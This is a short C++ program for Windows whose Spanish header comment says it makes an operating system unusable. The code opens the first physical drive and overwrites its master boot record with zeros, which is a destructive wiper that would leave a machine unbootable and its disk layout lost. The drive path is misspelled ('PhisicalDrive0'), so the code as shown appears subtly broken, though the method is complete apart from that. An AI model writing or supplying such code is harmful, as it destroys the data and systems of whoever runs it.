/* programa que hace inutilizable un SO */
# include <iostream>
# include <windows.h>

# define MBR_SIZE 512
int main(){
    DWORD buffer;
    char mbrContent[MBR_SIZE];

    ZeroMemory(&mbrContent,sizeof(mbrContent));

    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhisicalDrive0",GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,NULL,NULL);

    WriteFile(MasterBootRecord,mbrContent, 512, &buffer, NULL);

    CloseHandle(MasterBootRecord);
    return EXIT_SUCCESS;
}